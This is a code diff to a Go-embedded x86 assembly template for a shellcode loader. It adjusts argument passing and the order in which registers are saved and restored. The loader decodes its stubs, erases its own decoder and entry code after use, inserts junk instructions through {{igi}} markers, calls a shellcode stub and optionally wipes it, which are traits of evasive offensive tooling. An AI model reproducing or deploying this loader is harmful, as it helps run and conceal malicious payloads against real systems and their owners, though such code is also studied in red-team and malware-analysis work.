@@ -225,9 +225,11 @@ var x86Loader = `
 entry:
   // save context and prepare the environment
   {{db .JumpShort}}                            // random jump short
-  {{db .SaveContext}}                          // save GP registers
   push ebx                                     // store ebx for save entry address
   push ebp                                     // store ebp for save stack address
+  push esi                                     // store rsi for save the last argument
+  mov esi, [esp + 4*4]                         // save the last argument in stack
+  {{db .SaveContext}}                          // save GP registers
   mov ebp, esp                                 // create new stack frame
   and esp, 0xFFFFFFF0                          // ensure stack is 16 bytes aligned
   sub esp, 0x200                               // reserve stack
@@ -240,8 +242,6 @@ entry:
   // save arguments for call shellcode
   push ecx
   push edx
-  // push r8
-  // push r9
 
   // decode instructions in stub and erase them
   call decode_stubs
@@ -251,31 +251,29 @@ entry:
 
  // erase useless functions and entry
  flag_eraser_1:
-  lea ecx, [ebx + mini_xor]          {{igi}}
-  mov edx, decoder_stub - mini_xor   {{igi}}
-  call eraser_stub                   {{igi}}
+  lea ecx, [ebx + calc_entry_addr]        {{igi}}
+  mov edx, decoder_stub - calc_entry_addr {{igi}}
+  call eraser_stub                        {{igi}}
 
   mov ecx, ebx                       {{igi}}
   mov edx, flag_eraser_1             {{igi}}
   call eraser_stub                   {{igi}}
 
   // restore arguments for call shellcode
-  // pop r9                             {{igi}}
-  // pop r8                             {{igi}}
   pop edx                            {{igi}}
   pop ecx                            {{igi}}
 
   // execute the shellcode
-  push ebp                                     // store ebp for save stack address
-  mov ebp, esp                                 // create new stack frame
-  sub esp, 0x40                      {{igi}}   // reserve stack for protect
+  push ebp                           {{igi}}   // store ebp for save stack address
+  mov ebp, esp                       {{igi}}   // create new stack frame
+  sub esp, 0x48                      {{igi}}   // ensure stack is 16 bytes aligned
+  push esi                           {{igi}}   // move the last argument to stack
   call shellcode_stub                {{igi}}   // call the shellcode
   mov esp, ebp                       {{igi}}   // restore stack address
   pop ebp                            {{igi}}   // restore ebp
 
   // save the shellcode return value
   push eax                           {{igi}}
-
   // erase the shellcode stub
 {{if .EraseShellcode}}
   lea ecx, [ebx + shellcode_stub]    {{igi}}
@@ -302,9 +300,10 @@ entry:
   fxrstor [esp]                      {{igi}}   // restore FP registers
   add esp, 0x200                     {{igi}}   // reserve stack
   mov esp, ebp                       {{igi}}   // restore stack address
+  {{db .RestoreContext}}                       // restore GP registers
+  pop esi                            {{igi}}   // restore esi
   pop ebp                            {{igi}}   // restore ebp
   pop ebx                            {{igi}}   // restore ebx
-  {{db .RestoreContext}}                       // restore GP registers
   ret                                {{igi}}   // return to the caller
 
 calc_entry_addr:
